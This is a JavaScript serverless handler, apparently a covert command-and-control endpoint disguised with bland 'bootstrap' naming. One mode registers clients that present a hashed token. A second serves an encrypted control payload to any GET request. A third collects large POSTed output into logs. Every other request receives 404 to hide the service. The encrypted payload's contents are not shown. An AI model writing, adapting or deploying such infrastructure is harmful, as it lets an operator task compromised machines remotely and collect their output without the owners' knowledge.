import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '11';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
